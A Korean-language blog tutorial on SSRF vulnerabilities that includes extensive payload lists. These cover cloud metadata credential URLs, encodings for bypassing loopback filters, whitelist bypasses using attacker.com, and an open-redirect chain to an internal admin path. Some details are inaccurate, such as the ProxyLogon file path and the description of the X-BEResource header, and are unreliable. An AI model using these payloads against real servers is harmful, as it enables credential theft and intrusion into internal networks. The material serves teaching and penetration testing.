---
layout: single
title: Servcer Side Requests Forgery (SSRF)
categories: Web-vuln
tag: [Servcer Side Requests Forgery, SSRF, web, web vulnerability, injection]
toc: true
author_profile: false
---

# SSRF 취약점이란?

> SSRF는 클라이언트측의 입력값을 위조시켜 위조된 HTTP 요청을 보내, 일반적으로 외부에서 접근이 불가능한 **<u style="color:red;">서버 내부망에 접근(Access)</u>** 하여, 데이터 유출 및 서버의 기밀성, 가용성, 무결성을 파괴한다. SSRF 의 경우 CSRF 공격과 유사하지만, 공격이 이루어지는 부분이 클라이언트측이냐 서버측이냐의 차이점이 존재한다. 

💡 **<u>SSRF 공격이 성공적으로 Exploit 될 경우 추가 공격으로 이루어지므로, 피해가 크다.</u>** 
{: .notice--primary} 

# 어떻게 발생하는가?
모든 클라이언트측의 요청에 응답을 한 서버에서 다루기에는 무리가 있다. 그러므로 각 서버끼리의 API를 통해 서버끼리 내부적으로 통신을 통해 요청과 응답이 이루어진다. 이때 접근 가능한 내부 IP를 통해 이루어지므로 SSRF 의 경우 루프백(Loopback) 주소인 127.0.0.1 을 사용하여 공격이 주로 이루어진다.

# 공격 표면
주로 URL을 통해 HTTP 요청과 응답에 URL에 관련된 정보가 있을 경우 SSRF 의 잠재적 공격 표면이 될 수 있으며, 특정 웹 사이트의 정보를 불러들어 오는 부분을 유심히 봐야한다.
하지만 외에도 다른 서비스로의 요청을 하는 기능에서도 많이 발견되고 있다.

> SSRF 의 취약점 판별은 OAST를 통한 out-of-band 기술을 통해 쉽게 파악할 수 있다. OAST를 통해 외부로의 접점을 확인할 수 있으며, 외부로의 통신이 막혀 있다면, loaclhost, 사설 IP등을 호출하여 접근 가능 여부를 파악할 수 있다.

특히나 SSRF 공격의 경우, DMZ 뒤쪽에서 동작하기에, ACL 등 보안정책을 우회할 수 있다.
<u sytle="color:red;">보통 SSRF의 경우 서버단에서는 허용된 IP에 대해서만 화이트 리스트 기반을 통해서만 특정 서비스로의 요청이 실행된다.</u>

# 공격 유형
SSRF 를 활용한 공격 방식은 크게 3가지로 분류할 수 있다.
## Port Scan 및 내부 시스템 파일 탈취

<div class="notice">
    SSH 서비스 포트를 스캔할 시 file?=http//[IP]:22  구문 사용<br><br>

    [리눅스/유닉스]
<br>
    file?=http://file:///etc/passwd
<br>
    -- 허용하는 URL 스키마를 사용하여 접근 --
<br>
  <h4 style="color:red;">SSRF 의 경우 프로토콜에 대한 제한을 받지 않기때문에 FTP, SMTP, … 등 과 URI 스킴이 상용 가능하다.</h4>
</div>

## 2. Porxy Logon 기반 SSRF
2021년 CVE에 등록된 공개 취약점인 MS Exchange SSRF 를 활용
1. X-BEResoucrce 쿠키 변조를 통해 내부 서버 리소스 접근 가능

💡 **<u>X-BEResource는 Microsoft Exchange 서버에서 사용되는 특별한 HTTP 헤더이며, 이 헤더는 Exchange 서버의 원격 프로시저 호출(RPC) 기능에 대한 액세스를 관리하는데 사용된다.</u>** 
{: .notice--primary} 

2. /etc/proxyLogon.ecp 파일을 호출하여, 강제로 세션 연결이 가능한 proxyLogon을 이용해 별도의 인증 없이 공격자와 Exchange server와 HTTP연결 수행

> 해당 방법은 CVE-2021-26855 를 통해 자세하게 확인 가능하다.

## AWS 클라우드 기반 SSRF

💡 **<u>AWS 외에도 GCP, Azre, Digital Ocean등 public cloud를 사용하는 경우 Metadata API 로의 접근을 통해 instance에 대한 정보를 얻거나 중요한 키 값을 얻어 시스템을 탈취할 수 있다.</u>** 
{: .notice--primary} 

<div class="notice">
  [AWS]<br>
# 169.254.169.254<br>
http://169.254.169.254/latest/user-data<br>
http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]<br>
http://169.254.169.254/latest/meta-data/<br>
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]<br>
http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance<br>
http://169.254.169.254/latest/meta-data/ami-id<br>
http://169.254.169.254/latest/meta-data/reservation-id<br>
http://169.254.169.254/latest/meta-data/hostname<br>
http://169.254.169.254/latest/meta-data/public-keys/<br>
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key<br>
http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key<br>
http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy<br>
http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access<br>
http://169.254.169.254/latest/dynamic/instance-identity/document<br>
<br>
# instance-data<br>
http://instance-data/latest/meta-data<br>
http://instance-data/latest/meta-data/hostname<br>
http://instance-data/latest/meta-data/public-keys/
</div>

대표적으로 AWS의 Metadata API로의 접근 경로이다. 이 외에 다양한 API는 아래 링크에서 
확인이 가능하다.    

[참조 링크]: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#ssrf-url-for-cloud-instances

> 이렇게 외부에서 접근할 수 없는 위치에 존재하는 내부단에 접근하기 위해 LocalHost 주소를 통해 우회를  하게될 경우 localhost 를 필터링을 하는경우가 대부분이다. 

# Bypass  
## URL Parser 의 pasing 방법부터 알아보자.

![그림 1-1](/assets/image/vuln/web-vuln/SSRF/image.png)
위와 같은 형식으로 URI를 나누어서 해석할 수 있다.
💡 **<u>각 Parser 마다 pasing 방법이 상이할 수 있다.</u>** 
{: .notice--primary} 
보통 아래와 같은 형식으로 우회를 주로 시도한다.

<div class="notice">
http://attack.com#trust.com<br>
or<br>
http://trust.com@attack.com
</div>

- 위와같이 사용했을 때 # 이전의 url로 접근하는 이유는 일반적으로 
#은 브라우저에서 사용되는 프래그먼트 식별자이며, 서버로는 전달되지 않기 때문이다. 
- 또한 @를 쓸 경우 @이후의 url로 접근하는 것은 @는 URL에서 호스트를 구분하는 일반적인 구분문자이다. @다음에 원하는 주소를 사용할 경우 내부 서버에 접근 할 수 있다.  또한 몇몇 취약한 구현방식에서는 @를 호스트 구분 문자로 사용되지 않거나, 충분한 검증이 이루어지지 않을 수 있다.

## Bypass ‘127.0.0.1’ 
- [localhost](http://localhost) 주소가 BlackList 기반 정책을 통해 필터링 될 때 이를 우회할 수 있다.
주로 사용하는 loopback 주소를 우회하는 방법은 아주 다양하다.
크게 나누자면
1. 127.0.0.1 과 매핑된 도메인 주소 사용
2. 127.0.0.1 의 alias 사용
3. localhost의 alias 사용

<div class="notice">

# Localhost<br>
http://127.0.0.1:80<br>
http://127.0.0.1:443<br>
http://127.0.0.1:22<br>
http://127.1:80<br>
http://127.000000000000000.1<br>
http://0<br>
http:@0/ --> http://localhost/<br>
http://0.0.0.0:80<br>
http://localhost:80<br>
http://[::]:80/<br>
http://[::]:25/ SMTP<br>
http://[::]:3128/ Squid<br>
http://[0000::1]:80/<br>
http://[0:0:0:0:0:ffff:127.0.0.1]/thefile<br>
http://①②⑦.⓪.⓪.⓪<br>
http://vcap.me:8000/<br>
http://0x7f.0x00.0x00.0x01:8000/<br>
http://0x7f000001:8000/<br>
http://2130706433:8000/<br>
http://Localhost:8000/<br>
http://127.0.0.255:8000/<br>
<br>

# CDIR bypass<br>
http://127.127.127.127<br>
http://127.0.1.3<br>
http://127.0.0.0<br>
<br>

# Dot bypass<br>
127。0。0。1<br>
127%E3%80%820%E3%80%820%E3%80%821<br>
<br>

# Decimal bypass<br>
http://2130706433/ = http://127.0.0.1<br>
http://3232235521/ = http://192.168.0.1<br>
http://3232235777/ = http://192.168.1.1<br>
<br>

# Octal Bypass<br>
http://0177.0000.0000.0001<br>
http://00000177.00000000.00000000.00000001<br>
http://017700000001<br>
<br>

# Hexadecimal bypass<br>
127.0.0.1 = 0x7f 00 00 01<br>
http://0x7f000001/ = http://127.0.0.1<br>
http://0xc0a80014/ = http://192.168.0.20<br>
0x7f.0x00.0x00.0x01<br>
0x0000007f.0x00000000.0x00000000.0x00000001<br>
<br>

# Add 0s bypass<br>
127.000000000000.1<br>
<br>

# You can also mix different encoding formats<br>
# https://www.silisoftware.com/tools/ipconverter.php<br>
<br>

# Malformed and rare<br>
localhost:+11211aaa<br>
localhost:00011211aaaa<br>
http://0/<br>
http://127.1<br>
http://127.0.1<br>
<br>

# DNS to localhost<br>
localtest.me = 127.0.0.1<br>
customer1.app.localhost.my.company.127.0.0.1.nip.io = 127.0.0.1<br>
mail.ebc.apple.com = 127.0.0.6 (localhost)<br>
127.0.0.1.nip.io = 127.0.0.1 (Resolves to the given IP)<br>
www.example.com.customlookup.www.google.com.endcustom.sentinel.pentesting.us = Resolves to www.google.com<br>
http://customer1.app.localhost.my.company.127.0.0.1.nip.io<br>
http://bugbounty.dod.network = 127.0.0.2 (localhost)<br>
1ynrnhl.xip.io == 169.254.169.254<br>
spoofed.burpcollaborator.net = 127.0.0.1
</div>

## whitelist-based Bypass
백엔드 시스템에 접근하기 위해서는 서버측에서 신뢰할 수 있는 주소로만 접근 가능하도록
Whitelist 기반으로 필터링 정책이 이루어져 있을 수 있다.
이 때 위에서 보았듰이 URL 파서의 파싱원리를 통해 우회 가능한 많은 방법들이 존재한다.

<div class="notice">
http://attack.com#trust.com<br>
or<br>
http://trust.com@attack.com
</div>

만약 URL 파서가 @가 있는 경우, 호스트 부분을 추출하여 허용된 도메인과 비교하고, #기호가 있는 경우 요청을 거부한다면 SSRF 필터링은 주로 호스트 부분을 검증하고 차단하는 데 초점을 맞추기 때문에 이를 혼용해서 사용할 수 있다.

<div class="notice">
http://attack.com/@internal-server#example
</div>

<div class="notice--primary" markdown="1">
- 또한 http://127.0.0.1/admin 과 같은 Payload에서 문자를 url 인코딩을 통해서도 우회가 가능하다.

```
http://127.0.0.1/%61dmin
http://127.0.0.1/%2561dmin
```
<br>
# Try also to change attacker.com for 127.0.0.1 to try to access localhost
# Try replacing https by http
# Try URL-encoded characters<br>

https://{domain}@attacker.com<br>
https://{domain}.attacker.com<br>
https://{domain}%6D@attacker.com<br>
https://attacker.com/{domain}<br>
https://attacker.com/?d={domain}<br>
https://attacker.com#{domain}<br>
https://attacker.com@{domain}<br>
https://attacker.com#@{domain}<br>
https://attacker.com%23@{domain}<br>
https://attacker.com%00{domain}<br>
https://attacker.com%0A{domain}<br>
https://attacker.com?{domain}<br>
https://attacker.com///{domain}<br>
https://attacker.com\{domain}/<br>
https://attacker.com;https://{domain}<br>
https://attacker.com\{domain}/<br>
https://attacker.com\.{domain}<br>
https://attacker.com/.{domain}<br>
https://attacker.com\@@{domain}<br>
https://attacker.com:\@@{domain}<br>
https://attacker.com#\@{domain}<br>
https://attacker.com\anything@{domain}/<br>
https://www.victim.com(\u2044)some(\u2044)path(\u2044)(\u0294)some=param(\uff03)hash@attacker.com<br>
<br>

# On each IP position try to put 1 attackers domain and the others the victim domain<br>
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/<br>
<br>

#Parameter pollution<br>
next={domain}&next=attacker.com
</div>

**<u style="color:red;">AWS 외에도 GCP, Azre, Digital Ocean등 public cloud를 사용하는 경우 Metadata API 로의 접근을 통해 instance에 대한 정보를 얻거나 중요한 키 값을 얻어 시스템을 탈취할 수 있다.</u>** 
![그림 1-2](/assets/image/vuln/web-vuln/SSRF/image-1.png)

### 입력값(URL)이 특정 경로 또는 확장자로 끝나거나, 화이트리스트에 등록된 패스가 포함되어야 하는 경우라면?

<div class="notice--primary" markdown="1">
https://metadata/vulerable/path#/expected/path<br>
https://metadata/vulerable/path#.extension<br>
https://metadata/expected/path/..%2f..%2f/vulnerable/path<br>
위와같이 사용할 수 있다.
</div>

## Bypass via open redirect
SSRF 에 대한 검증 절차가 잘 이루어져 있어 공격이 힘들 경우 Open redirect를 통한 우회가 가능하다.

<div class="notice--primary" markdown="1">
GET /product/choiseProduct?choiseProductId=6&path=http://evil-user.net
</div>
위와 같은 url 과 reirect 기능이 존재하는 요청문이 있다면,
http://evil-user.net로 redirect 될것이다. 이부분을 아래와같이 악용할 수 있다.

<div class="notice--primary" markdown="1">
GET /product/choiseProduct?choiseProductId=6&path=http:192.168.0.10/admin
</div>
위 내용을 SSRF 취약점이 예상되는 API 앤드포인트에 적어주면 된다.
<div class="notice--primary" markdown="1">
POST /product/choise HTTP/2

'''
'''
'''

api-endpoing=/product/choiseProduct?choiseProductId=6&path=http:192.168.0.10/admin
</div>

💡 **<u style="color:red;">특정 기능에서 http://uri~ 로의 요청 로직이 있을 경우 이 때 file 과 같은 다른 URI 스킴을 사용할 수 있으며, file 스킴의 경우 file:/, file://, file:/// 모두 사용할 수 있다.</u>** 
{: .notice--primary} 

# Referance
- https://www.hahwul.com/cullinan/ssrf/
- https://www.igloo.co.kr/security-information/category/issue/page/1/
- https://portswigger.net/web-security/ssrf
- https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass